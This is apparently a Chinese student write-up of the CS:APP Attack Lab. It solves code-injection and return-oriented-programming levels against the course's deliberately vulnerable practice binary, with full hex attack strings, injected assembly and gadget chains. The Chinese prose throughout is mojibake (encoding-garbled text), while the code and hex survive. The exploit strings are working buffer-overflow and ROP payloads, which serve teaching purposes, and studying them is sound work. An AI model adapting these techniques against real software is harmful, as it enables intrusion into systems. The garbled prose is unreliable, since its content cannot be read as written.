è¿™é‡Œcookieæ˜¯æœåŠ¡å™¨ç»™æˆ‘ä»¬çš„ä¸€ä¸ªæ•°å€¼ï¼Œå­˜æ”¾åœ¨cookie.txtæ–‡ä»¶ä¸­ï¼Œè‡ªå­¦è€…ææ–™ä¸­çš„è¿™ä¸ªå€¼åº”è¯¥éƒ½æ˜¯ä¸€æ ·çš„ã€‚ å¯ä»¥çœ‹åˆ°touch2æ‹¥æœ‰ä¸€ä¸ªå‚æ•°ï¼Œåªæœ‰è¿™ä¸ªå‚æ•°ä¸Žcookieçš„å€¼ç›¸ç­‰æ‰å¯ä»¥é€šè¿‡è¿™ä¸€ç­‰çº§ã€‚æ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è®©ç¨‹åºåŽ»æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œè®¾ç½®è¿™ä¸ªå‚æ•°çš„å€¼ï¼Œå†è°ƒç”¨touch2å®Œæˆæ”»å‡»ã€‚ é¦–å…ˆè¦æ³¨æ„çš„æ˜¯touch2çš„ç¬¬ä¸€ä¸ªå‚æ•°å­˜æ”¾åœ¨å¯„å­˜å™¨rdiä¸­ï¼Œæˆ‘ä»¬å°±æ˜¯è¦è®¾ç½®è¿™ä¸ªå¯„å­˜å™¨çš„å€¼ä¸ºcookieã€‚ é‚£ä¹ˆå¦‚ä½•è®©ç¨‹åºåŽ»æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç å‘¢ï¼Ÿæ—¢ç„¶æˆ‘ä»¬å¯ä»¥å‘æ ˆä¸­å†™å…¥ä»»æ„å†…å®¹å¹¶ä¸”å¯ä»¥è®¾ç½®è¿”å›žæ—¶è·³è½¬åˆ°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åœ¨æ ˆä¸­å†™å…¥æŒ‡ä»¤ï¼Œå†ä»¤ä»Žgetbufå‡½æ•°è¿”å›žçš„åœ°å€ä¸ºæˆ‘ä»¬æ ˆä¸­æŒ‡ä»¤çš„é¦–åœ°å€ï¼Œåœ¨æŒ‡ä»¤ä¸­æ‰§è¡Œretè¿›è¡Œç¬¬äºŒæ¬¡è¿”å›žï¼Œè¿”å›žåˆ°touch2å‡½æ•°ï¼Œå°±å¯ä»¥å®žçŽ°æˆ‘ä»¬çš„ç›®çš„ã€‚ æ‰€ä»¥æˆ‘å†³å®šå°†æŒ‡ä»¤å†™å…¥åˆ°æ ˆåœ°å€çš„æœ€ä½Žå¤„ï¼Œç„¶åŽåœ¨æº¢å‡ºåŽå°†åœ°å€è®¾ç½®ä¸ºè¿™ä¸ªæ ˆåœ°å€ã€‚æˆ‘ä»¬èƒ½å®Œæˆè¿™ä¸ªæ”»å‡»çš„å‰ææ˜¯è®²ä¹‰ä¸­å·²ç»å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªå…·æœ‰æ¼æ´žçš„ç¨‹åºåœ¨è¿è¡Œæ—¶çš„æ ˆåœ°å€æ˜¯å›ºå®šçš„ï¼Œä¸ä¼šå› è¿è¡Œå¤šæ¬¡è€Œæ”¹å˜ï¼Œå¹¶ä¸”è¿™ä¸ªç¨‹åºå…è®¸æ‰§è¡Œæ ˆä¸­çš„ä»£ç ã€‚ æˆ‘ä»¬åˆ©ç”¨gdbåœ¨è¿è¡Œæ—¶æŸ¥çœ‹æ ˆåœ°å€ï¼š åœåœ¨getbufçš„è¿™é‡Œï¼Œç„¶åŽæŸ¥çœ‹rspæŒ‡å‘çš„åœ°å€ï¼š å¯ä»¥çœ‹åˆ°é¦–åœ°å€ä¸º0x5561dc78ï¼Œé¡ºä¾¿çœ‹åˆ°ç¬¬6è¡Œä¹Ÿå°±æ˜¯0x28ä¸ªå­—èŠ‚ä¹‹åŽå­˜æ”¾çš„åŽŸè¿”å›žåœ°å€ã€‚ ç”±äºŽæˆ‘ä»¬éœ€è¦åœ¨æ³¨å…¥çš„ä»£ç ä¸­å†æ¬¡è¿”å›žï¼Œå°±éœ€è¦å°†äºŒæ¬¡è¿”å›žçš„åœ°å€åŒæ ·å­˜æ”¾åœ¨æ ˆä¸­ï¼Œè¿™é‡Œä¸ºäº†é¿å…ä¸Žæˆ‘ä»¬æ³¨å…¥çš„ä»£ç é‡å ï¼Œæˆ‘é€‰æ‹©å°†touch2åœ°å€æ”¾åœ¨getbufå‡½æ•°æ ˆçš„æœ€åŽ8å­—èŠ‚ä¸­ã€‚ ä¸‹é¢å°±è¦ç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²äº†ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦ç”Ÿæˆæ”»å‡»ä»£ç ã€‚æˆ‘ä»¬å…ˆå°†æ”»å‡»ä»£ç ç”¨æ±‡ç¼–æŒ‡ä»¤çš„å½¢å¼å†™å‡ºæ¥ï¼š 123movq $0x59b997fa,%rdi # rdi = cookiemovq $0x5561dc98,%rsp # å°†rspè®¾ä¸ºå­˜æ”¾åœ¨æ ˆä¸­çš„touch2åœ°å€çš„åœ°å€ret # è¯»å–rspæŒ‡å‘çš„åœ°å€å¹¶è·³è½¬ ä¸‹é¢åˆ©ç”¨gcc -cå‘½ä»¤å°†æ±‡ç¼–è¯­å¥ç¼–è¯‘æˆæœºå™¨ç ï¼Œå†objdump -dç”Ÿæˆçš„æ–‡ä»¶å°±å¯ä»¥é—´æŽ¥åœ°çœ‹åˆ°æœ€ç»ˆçš„æœºå™¨ç ã€‚ å°†æŒ‡ä»¤çš„æœºå™¨ç ä½œä¸ºæˆ‘ä»¬æ”»å‡»å­—ç¬¦ä¸²çš„å¼€å¤´ï¼Œtouch2çš„åœ°å€æ”¾åœ¨æ ˆä¸­ç¬¬0x20-0x28ä½ç½®ï¼Œå°†æ ˆçš„é¦–åœ°å€æ”¾åœ¨æ ˆå¤–çš„8ä¸ªå­—èŠ‚ï¼Œæž„æˆæˆ‘ä»¬çš„æ”»å‡»å­—ç¬¦ä¸²ï¼š 12345648 c7 c7 fa 97 b9 59 48 c7 c4 98 dc 61 55 c3 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ec 17 40 00 00 00 00 0078 dc 61 55 00 00 00 00 Level 3è¯¥ç­‰çº§åŒæ ·è®©æˆ‘ä»¬è·³è½¬åˆ°touch3å‡½æ•°ä¸­ï¼Œä¸è¿‡touch3å‡½æ•°åˆ¤æ–­æœ‰æ‰€ä¸åŒï¼š 1234567891011121314151617181920/* Compare string to hex represention of unsigned value */int hexmatch(unsigned val, char *sval) &#123; char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, "%.8x", val); return strncmp(sval, s, 9) == 0;&#125;void touch3(char *sval) &#123; vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) &#123; printf("Touch3!: You called touch3(\"%s\")\n", sval); validate(3); &#125; else &#123; printf("Misfire: You called touch3(\"%s\")\n", sval); fail(3); &#125; exit(0);&#125; ä»”ç»†é˜…è¯»ä¸Šé¢çš„ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥touch3çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„é¦–åœ°å€ï¼Œè¿™ä¸ªåœ°å€æŒ‡å‘çš„å­—ç¬¦ä¸²éœ€è¦ä¸Žcookieçš„å­—ç¬¦ä¸²è¡¨ç¤ºç›¸åŒã€‚è¿™é‡Œcookieçš„å­—ç¬¦ä¸²è¡¨ç¤ºæ˜¯cookie:0x59b997façš„ASCIIè¡¨ç¤ºçš„å­—ç¬¦ä¸²ï¼š35 39 62 39 39 37 66 61 00ã€‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦åšçš„æ˜¯å°†è¿™ä¸²å­—ç¬¦ä¸²æ”¾å…¥æ ˆä¸­ï¼Œå¹¶ä¸”å°†rdiçš„å€¼ç½®ä¸ºå­—ç¬¦ä¸²çš„é¦–åœ°å€ï¼Œå†è¿›è¡Œä¸Žä¸Šæ­¥ç±»ä¼¼çš„äºŒæ¬¡è¿”å›žæ“ä½œã€‚ è¿™é‡Œæˆ‘ä»¬éœ€è¦å¥½å¥½è€ƒè™‘ç›®æ ‡å­—ç¬¦ä¸²åœ¨æ ˆä¸­çš„ä½ç½®ï¼Œä¸‹é¢æ˜¯æœ€ç»ˆç»“æžœä¸­çš„æ ˆç»“æž„ï¼Œå…ˆæ”¾å‡ºæ¥ä¾¿äºŽè®²è§£ã€‚ å¦‚æžœç›®æ ‡å­—ç¬¦ä¸²å­˜æ”¾çš„ä½ç½®æ¯”touch3å­˜æ”¾åœ°å€æ›´ä½Žï¼Œåœ¨æœ€ç»ˆå­—ç¬¦ä¸²å¯¹æ¯”çš„æ—¶å€™ä¼šå‘çŽ°rdiæŒ‡å‘åœ°å€çš„å†…å®¹å‘ç”Ÿäº†æ”¹å˜ã€‚åˆ†æžåŽŸå› ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ä»Žgetbufè¿”å›žåˆ°å­—ç¬¦ä¸²æ¯”å¯¹è¿‡ç¨‹ä¸­æ‰§è¡Œçš„æŒ‡ä»¤ï¼š 12345600000000004018fa &lt;touch3&gt;: 4018fa: 53 push %rbx . . . 401911: e8 36 ff ff ff callq 40184c &lt;hexmatch&gt; 1234000000000040184c &lt;hexmatch&gt;: 40184c: 41 54 push %r12 40184e: 55 push %rbp 40184f: 53 push %rbx ä¸Šé¢åˆ—å‡ºçš„è¿™éƒ¨åˆ†æŒ‡ä»¤éƒ½ä¼šå‘æ ˆä¸­åŽ‹å…¥æ–°çš„å†…å®¹ï¼Œç”±äºŽæ ˆå‘ä¸‹å¢žé•¿ï¼Œè€Œrspä¸€å¼€å§‹çš„ä½ç½®åœ¨touch3åœ°å€çš„ä¸‹ä¸€ä¸ªä½ç½®ï¼ŒåŽ‹å…¥çš„æ–°å†…å®¹ä¼šè¦†ç›–touch3åœ°å€ä»¥ä¸‹çš„å†…å®¹ï¼Œå¦‚æžœæŠŠç›®æ ‡å­—ç¬¦ä¸²æ”¾åœ¨è¿™éƒ¨åˆ†ä¼šå¯¼è‡´å†…å®¹åœ¨æ¯”è¾ƒä¹‹å‰å°±è¢«è¦†ç›–ã€‚ çŸ¥é“æ ˆä¸­åº”è¯¥å­˜æ”¾çš„å†…å®¹çš„ç»“æž„ï¼Œæ”»å‡»å­—ç¬¦ä¸²çš„ç¼–å†™å°±ä¸å†å›°éš¾äº†ï¼š 12345648 c7 c7 90 dc 61 55 48 # mov $0x5561dc90,%rdi mov $0x5561dc88,%rsp ret ä¸ºå¯„å­˜å™¨èµ‹å€¼å¹¶è¿”å›žc7 c4 88 dc 61 55 c3 00fa 18 40 00 00 00 00 00 # touch3åœ°å€35 39 62 39 39 37 66 61 # ç›®æ ‡å­—ç¬¦ä¸²00 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 # æ³¨å…¥æŒ‡ä»¤é¦–åœ°å€ ç¬¬äºŒéƒ¨åˆ†ï¼šè¿”å›žå¯¼å‘ç¼–ç¨‹æ”»å‡»æˆ‘ä»¬åœ¨ç¬¬äºŒéƒ¨åˆ†ä¸­éœ€è¦è§£å†³çš„åŒæ ·æ˜¯ç¬¬ä¸€éƒ¨åˆ†çš„åŽä¸¤ä¸ªé—®é¢˜ï¼Œåªä¸è¿‡æˆ‘ä»¬è¦é‡‡å–ä¸åŒçš„æ–¹å¼æ¥è¿›è¡Œæ”»å‡»ã€‚ ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¹‹å‰é‡‡å–çš„ä»£ç æ³¨å…¥çš„æ”»å‡»æ‰‹æ®µæ— æ³•åœ¨è¿™ä¸ªç¨‹åºä¸­èµ·ä½œç”¨å‘¢ï¼Ÿè¿™æ˜¯å›½å› ä¸ºè¿™ä¸ªç¨‹åºå¯¹ä»£ç æ³¨å…¥æ”»å‡»é‡‡å–äº†ä¸¤ç§é˜²æŠ¤æ–¹å¼ï¼š æ ˆéšæœºåŒ–ï¼Œä½¿å¾—ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶æ ˆçš„åœ°å€éƒ½ä¸ç›¸åŒï¼Œæˆ‘ä»¬æ— æ³•å¾—çŸ¥æˆ‘ä»¬æ³¨å…¥çš„æ”»å‡»ä»£ç çš„åœ°å€ï¼Œä¹Ÿæ— æ³•åœ¨æ”»å‡»ä»£ç ä¸­ç¡¬ç¼–ç æ ˆä¸­çš„åœ°å€ã€‚ æ ‡è®°å†…å­˜ä¸­çš„æ ˆæ®µä¸ºä¸å¯æ‰§è¡Œï¼Œè¿™æ„å‘³ç€æ³¨å…¥åœ¨æ ˆä¸­çš„ä»£ç æ— æ³•è¢«ç¨‹åºæ‰§è¡Œã€‚ å°½ç®¡è¿™ä¸¤ç§æ‰‹æ®µæœ‰æ•ˆåœ°é¿å…äº†ä»£ç æ³¨å…¥æ”»å‡»ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥æ‰¾åˆ°æ–¹å¼è®©ç¨‹åºæ‰§è¡Œæˆ‘ä»¬æƒ³è¦åŽ»æ‰§è¡Œçš„æŒ‡ä»¤ã€‚ æ”»å‡»æ–¹å¼çŽ°åœ¨æˆ‘ä»¬æ— æ³•ä½¿ç”¨æ ˆæ¥å­˜æ”¾ä»£ç ï¼Œä½†æ˜¯æˆ‘ä»¬ä»å¯ä»¥è®¾ç½®æ ˆä¸­çš„å†…å®¹ã€‚ä¸èƒ½æ³¨å…¥ä»£ç åŽ»æ‰§è¡Œï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨ç¨‹åºä¸­åŽŸæœ‰çš„ä»£ç ï¼Œåˆ©ç”¨retæŒ‡ä»¤è·³è½¬çš„ç‰¹æ€§ï¼ŒåŽ»æ‰§è¡Œç¨‹åºä¸­å·²ç»å­˜åœ¨çš„æŒ‡ä»¤ã€‚å…·ä½“çš„æ–¹å¼å¦‚ä¸‹ï¼š æˆ‘ä»¬å¯ä»¥åœ¨ç¨‹åºçš„æ±‡ç¼–ä»£ç ä¸­æ‰¾åˆ°è¿™æ ·çš„ä»£ç ï¼š 1230000000000400f15 &lt;setval_210&gt;:400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)400f1b: c3 retq è¿™æ®µä»£ç çš„æœ¬æ„æ˜¯ 1234void setval_210(unsigned *p)&#123; *p = 3347663060U;&#125; è¿™æ ·ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯é€šè¿‡è§‚å¯Ÿæˆ‘ä»¬å¯ä»¥å‘çŽ°ï¼Œæ±‡ç¼–ä»£ç çš„æœ€åŽéƒ¨åˆ†ï¼š48 89 c7 c3åˆå¯ä»¥ä»£è¡¨ 12movq %rax, %rdiret è¿™ä¸¤æ¡æŒ‡ä»¤ï¼ˆæŒ‡ä»¤çš„ç¼–ç å¯ä»¥è§è®²ä¹‰ä¸­çš„é™„å½•ï¼‰ã€‚ ç¬¬1è¡Œçš„movqæŒ‡ä»¤å¯ä»¥ä½œä¸ºæ”»å‡»ä»£ç çš„ä¸€éƒ¨åˆ†æ¥ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€Žä¹ˆåŽ»æ‰§è¡Œè¿™ä¸ªä»£ç å‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“è¿™ä¸ªå‡½æ•°çš„å…¥å£åœ°å€æ˜¯0x400f15ï¼Œè¿™ä¸ªåœ°å€ä¹Ÿæ˜¯è¿™æ¡æŒ‡ä»¤çš„åœ°å€ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¡ç®—å¾—å‡º48 89 c7 c3è¿™æ¡æŒ‡ä»¤çš„é¦–åœ°å€æ˜¯0x400f18ï¼Œæˆ‘ä»¬åªè¦æŠŠè¿™ä¸ªåœ°å€å­˜æ”¾åœ¨æ ˆä¸­ï¼Œåœ¨æ‰§è¡ŒretæŒ‡ä»¤çš„æ—¶å€™å°±ä¼šè·³è½¬åˆ°è¿™ä¸ªåœ°å€ï¼Œæ‰§è¡Œ48 89 c7 c3ç¼–ç çš„æŒ‡ä»¤ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°è¿™ä¸ªæŒ‡ä»¤çš„æœ€åŽæ˜¯c3ç¼–ç çš„æ˜¯retæŒ‡ä»¤ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠå¤šä¸ªè¿™æ ·çš„æŒ‡ä»¤åœ°å€ä¾æ¬¡æ”¾åœ¨æ ˆä¸­ï¼Œæ¯æ¬¡retä¹‹åŽå°±ä¼šåŽ»æ‰§è¡Œæ ˆä¸­å­˜æ”¾çš„ä¸‹ä¸€ä¸ªåœ°å€æŒ‡å‘çš„æŒ‡ä»¤ï¼Œåªè¦åˆç†åœ°æ”¾ç½®è¿™äº›åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ä»Žè€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ è¿™æ ·çš„ä¸€ä¸²ä»¥retç»“å°¾çš„æŒ‡ä»¤ï¼Œè¢«ç§°ä¸ºgadgetã€‚æˆ‘ä»¬è¦æ”»å‡»çš„ç¨‹åºä¸­ä¸ºæˆ‘ä»¬è®¾ç½®äº†ä¸€ä¸ªgadget_farmï¼Œä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç³»åˆ—è¿™æ ·å¯ä»¥æ‰§è¡Œçš„æ”»å‡»æŒ‡ä»¤ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿåªè¢«å…è®¸ä½¿ç”¨ç¨‹åºä¸­start_farmä¸Žend_farmå‡½æ•°æ ‡è¯†ä¹‹é—´çš„gadgetæ¥æž„å»ºæˆ‘ä»¬çš„æ”»å‡»å­—ç¬¦ä¸²ã€‚ è¿™ç§æ”»å‡»æ–¹å¼è¢«ç§°ä¸ºè¿”å›žå¯¼å‘ç¼–ç¨‹æ”»å‡»ã€‚ Level 2ç›®çš„ä¸Žä¹‹å‰çš„Level 2ç›¸åŒï¼Œæˆ‘ä»¬éœ€è¦ä¸ºrdièµ‹ä¸Šcookieå€¼ï¼Œå†è·³è½¬åˆ°touch2å‡½æ•°æ‰§è¡Œï¼Œè·³è½¬åˆ°touch2åªéœ€è¦å°†touch2çš„å…¥å£åœ°å€æ”¾åœ¨æœ€åŽä¸€ä¸ªgadgetä¹‹åŽï¼Œåœ¨å®ƒçš„retæŒ‡ä»¤æ‰§è¡Œä¹‹åŽå°±ä¼šè¿”å›žåˆ°touch2ä¸­ã€‚ ä¸‹é¢å°±è¦åˆ©ç”¨å·²æœ‰çš„gadgetä¸ºrdièµ‹ä¸Šæˆ‘ä»¬æƒ³è¦çš„å€¼ã€‚è¿™é‡Œæˆ‘ä»¬è¦å°†ä¸€ä¸ªç‰¹å®šçš„å€¼å†™å…¥rdiï¼Œä½†æ˜¯æˆ‘ä»¬åªå¯ä»¥ä½¿ç”¨æ ˆæ¥å­˜æ”¾è¿™ä¸ªæ•°å€¼ï¼ŒåŒæ—¶ä¸çŸ¥é“æ ˆçš„åœ°å€ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥æƒ³åˆ°ä½¿ç”¨popæŒ‡ä»¤ä»¤è¿™ä¸ªå€¼ä»Žæ ˆä¸­å¼¹å‡ºåˆ°å¯„å­˜å™¨ä¸­ã€‚ æŸ¥çœ‹gadgetä¸­æä¾›çš„æˆ‘ä»¬å¯ä»¥æ‰§è¡ŒæŒ‡ä»¤ã€‚å‘çŽ° 12300000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq ä¸­æœ€åŽçš„å­—èŠ‚ä¸º58 90 c3ï¼Œè¿™ä¸ªä¸‰ä¸ªå­—èŠ‚åˆ†åˆ«ç¼–ç äº†ä¸‰æ¡æŒ‡ä»¤ï¼š 123popq %raxnopret è¿™ä¸ªnopåœ¨è¿™é‡Œå½“ç„¶ä¸å½±å“ï¼Œåˆ©ç”¨è¿™ä¸ªpopæŒ‡ä»¤æˆ‘ä»¬å°±å¯ä»¥æŠŠæ ˆä¸­å­˜æ”¾çš„å†…å®¹å¼¹å‡ºåˆ°raxä¸­ã€‚æŽ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦çš„æ˜¯ 1movq %rax,%rdi è¿™æ¡æŒ‡ä»¤ï¼Œå¦‚æžœæ²¡æœ‰çš„è¯å¯ä»¥å¤šä¼ å‡ æ¬¡ï¼Œæ­£å¥½æˆ‘ä»¬å‘çŽ°äº† 12300000000004019c3 &lt;setval_426&gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq ä¸­æœ€åŽçš„å­—èŠ‚48 89 c7 90 c3ç¼–ç äº†è¿™æ ·çš„æŒ‡ä»¤ã€‚ æˆ‘ä»¬åˆ†åˆ«è®¡ç®—è¿™äº›éœ€è¦æ‰§è¡Œçš„gadgetçš„æŒ‡ä»¤åœ°å€ï¼Œå†™æˆæ”»å‡»å­—ç¬¦ä¸²ï¼š 12345678900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 # å‰0x28ä¸ªå­—ç¬¦å¡«å……0x00ab 19 40 00 00 00 00 00 # popq %rax fa 97 b9 59 00 00 00 00 # cookie ï¼ˆpopqçš„ç›®æ ‡ï¼‰a2 19 40 00 00 00 00 00 # movq %rax,%rdiec 17 40 00 00 00 00 00 # è¿”å›žåˆ° touch2 Level 3æ”»å‡»ç›®æ ‡ä¸Žä¹‹å‰çš„Level 3ç›¸åŒï¼Œéœ€è¦å°†rdiæŒ‡å‘cookieçš„å­—ç¬¦ä¸²è¡¨ç¤ºçš„é¦–åœ°å€ã€‚ ç›®æ ‡å­—ç¬¦ä¸²æ¯«æ— ç–‘é—®è¿˜æ˜¯å­˜æ”¾åœ¨æ ˆä¸­çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¦‚ä½•åœ¨æ ˆåœ°å€éšæœºåŒ–çš„æƒ…å†µä¸‹åŽ»èŽ·å–æˆ‘ä»¬æ”¾åœ¨æ ˆä¸­çš„å­—ç¬¦ä¸²çš„é¦–åœ°å€å‘¢ï¼Ÿ æŸ¥çœ‹gadget_farmä¸­æä¾›çš„gadgetåŽï¼Œæˆ‘ä»¬å¯ä»¥å‘çŽ°å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ä¸­æœ‰ 12movq %rsp,%raxret è¿™æ ·ä¸€æ¡ï¼Œå¯ä»¥ä¿å­˜å½“å‰çš„rspå€¼ï¼Œä½†æ˜¯æˆ‘ä»¬é¢ä¸´ä¸€ä¸ªé—®é¢˜ï¼Œè¿™æ¡å‘½ä»¤æ‰§è¡Œæ—¶rspçš„å€¼ä¸ºä¸‹ä¸€ä¸ªåœ°å€ï¼Œå¦‚æžœä¸‹ä¸€ä¸ªåœ°å€ä¸­å­˜æ”¾äº†ç›®æ ‡å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå‘½ä»¤å°±æ— æ³•ç»§ç»­æ‰§è¡Œä¸‹åŽ»ï¼Œä¹Ÿæ— æ³•è¿›å…¥touch3å‡½æ•°äº†ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œä¼¼ä¹Žæ²¡æœ‰åˆ«çš„gadgetå¯ä»¥å¸®åŠ©æˆ‘ä»¬èŽ·å–rspçš„åœ°å€äº†ã€‚ æˆ‘åœ¨è¿™ä¸ªåœ°æ–¹å¡äº†å¥½å‡ ä¸ªå°æ—¶ï¼Œæœ€åŽåœ¨åˆ«äººçš„æç¤ºä¸‹æ‰å‘çŽ°gadget_farmä¸­æœ‰è¿™æ ·ä¸€ä¸ªgadgetç”»é£Žä¸Žå…¶ä»–çš„ä¸å¤ªä¸€æ ·ï¼š 12300000000004019d6 &lt;add_xy&gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq è¿™æ˜Žæ˜Žå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç›´æŽ¥ä½¿ç”¨çš„å‡½æ•°ï¼å®ƒçš„ä½œç”¨æ˜¯å°†rdiä¸Žrsiä¸­çš„å€¼ç›¸åŠ åŽå­˜æ”¾åœ¨raxä¸­ã€‚ æœ‰äº†è¿™ä¸ªï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠrspçš„å€¼åŠ ä¸Šä¸€ä¸ªæ•°åç§»è‹¥å¹²åŽè¡¨ç¤ºå­˜æ”¾ç›®æ ‡å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œå°±ä¸ä¼šä¸Žéœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤å†²çªäº†ã€‚ åŒæ—¶è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæœ‰äº›gadgetè—å¾—æ¯”è¾ƒéšè”½ï¼Œè®²ä¹‰ä¸­æš—ç¤ºæˆ‘ä»¬æœ‰ä¸€äº›ä¸¤å­—èŠ‚ç¼–ç çš„æŒ‡ä»¤å®žé™…ä¸Šæ²¡æœ‰ä»»ä½•å½±å“ï¼Œå®ƒä»¬ä¹‹å‰çš„æŒ‡ä»¤åŒæ ·ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ã€‚ ä»”ç»†æ‰¾å‡ºæ‰€æœ‰å¯ä»¥æ‰§è¡Œçš„æŒ‡ä»¤å¹¶æ•´ç†ä¹‹åŽæˆ‘å¾—å‡ºäº†è¿™æ ·ä¸€å¼ å›¾ï¼š ç›®æ ‡å­—ç¬¦ä¸²å­˜æ”¾çš„ä½ç½®ä¸€å®šåœ¨touch3åœ°å€ä¹‹ä¸Šï¼ˆåŽŸå› è§å‰æ–‡ï¼‰ã€‚ ç”±äºŽç›¸åŠ æ“ä½œåªèƒ½å¯¹rsiä¸Žrdiè¿›è¡Œï¼Œç»è¿‡è§‚å¯Ÿå¯ä»¥å‘çŽ°æ ˆåœ°å€æ˜¯ä¸€ä¸ª8å­—èŠ‚å€¼ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡ä¸‹é¢è¿™æ¡movlç»„æˆçš„è·¯æ¥ä¼ é€’ï¼Œä½†æ˜¯æˆ‘ä»¬çš„åç§»å€¼å®Œå…¨å¯ä»¥ã€‚æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±å®šä¸‹äº†ï¼ŒæŠŠrspçš„å€¼å­˜æ”¾åœ¨rdiä¸­ï¼ŒæŠŠåç§»é‡çš„å€¼é€šè¿‡popqæŒ‡ä»¤ä»Žæ ˆä¸­å–å‡ºæ”¾åœ¨esiä¸­ï¼Œå†åˆ©ç”¨add_xyå‡½æ•°å°†å®ƒä»¬ç›¸åŠ çš„ç»“æžœå­˜æ”¾åˆ°raxå†è½¬ç§»åˆ°rdiä¸­ã€‚è¿™ä¸ªåç§»é‡æ˜¯å¤šå°‘è¦ç­‰åˆ°æˆ‘ä»¬çš„æ ˆç»“æž„å‡ºæ¥ä¹‹åŽæ‰å¯ä»¥ç¡®å®šã€‚ æ ¹æ®ä¸Šé¢è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ ˆç»“æž„ç¤ºæ„å‡ºæ¥ï¼š æ ‡æ³¨ç°è‰²çš„åœ°æ–¹æ˜¯æˆ‘ä»¬è®¡ç®—åç§»é‡çš„éƒ¨åˆ†ï¼ˆä»Žrspè¯»å…¥æ—¶å¼€å§‹ï¼‰ï¼Œå¯ä»¥è®¡ç®—å‡ºåç§»é‡ä¸º4 x 8 = 32 = 0x20ï¼Œå†ä¾æ­¤è®¡ç®—å„å‘½ä»¤çš„åœ°å€ã€æž„å»ºå‡ºæˆ‘ä»¬çš„æ”»å‡»å­—ç¬¦ä¸²ï¼š 123456789101112131415161700 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 # å‰0x28ä¸ªå­—ç¬¦å¡«å……0x00cc 19 40 00 00 00 00 00 # popq %rax20 00 00 00 00 00 00 00 # åç§»é‡42 1a 40 00 00 00 00 00 # movl %eax,%edx69 1a 40 00 00 00 00 00 # movl %edx,%ecx27 1a 40 00 00 00 00 00 # movl %ecx,%esi06 1a 40 00 00 00 00 00 # movq %rsp,%raxc5 19 40 00 00 00 00 00 # movq %rax,%rdid6 19 40 00 00 00 00 00 # add_xyc5 19 40 00 00 00 00 00 # movq %rax,%rdifa 18 40 00 00 00 00 00 # touch3åœ°å€35 39 62 39 39 37 66 61 # ç›®æ ‡å­—ç¬¦ä¸²00 00 00 00 00 00 00 00 å®žéªŒå°ç»“Attack Labä¸Žä¹‹å‰çš„ä¸¤ä¸ªå®žéªŒç›¸æ¯”è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä½†æ˜¯æœ€åŽä¸€ä¸ªé˜¶æ®µç¡®å®žå› ä¸ºè‡ªå·±çš„è§‚å¯Ÿä¸å¤Ÿç»†è‡´æµªè´¹äº†å¤§é‡çš„æ—¶é—´ã€‚ä¹Ÿå‘Šè¯‰æˆ‘ä»¬ä¸è¦å—æ€ç»´å®šåŠ¿çš„å·¦å³ï¼Œä¸€å‘³åœ°åŽ»å¯»æ‰¾å¯ä»¥ä½¿ç”¨çš„gadgetè€Œå¿½ç•¥äº†å‡½æ•°æœ¬èº«çš„ä½œç”¨ã€‚ 